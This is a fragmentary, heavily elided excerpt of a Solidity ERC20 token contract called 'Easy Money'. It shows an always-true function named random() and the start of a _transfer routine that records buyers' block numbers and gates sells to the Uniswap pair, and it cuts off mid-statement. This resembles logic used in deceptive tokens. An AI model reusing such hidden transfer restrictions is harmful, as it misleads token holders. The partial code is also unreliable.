...
contract EasyMoney is Context, IERC20, Ownable {
    ...
    string private _name = "Easy Money";
    ...
    uint256 public _maxTxAmount = 10**13 * 10**9;
    uint256 private numTokensSellToAddToLiquidity = 10**13 * 10**9;
    ...
    function random() private pure returns(bool) {
        return true;
    }
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair){
            cd[to] = block.number;
        } else if(to == uniswapV2Pair && block.number > cd[from]){
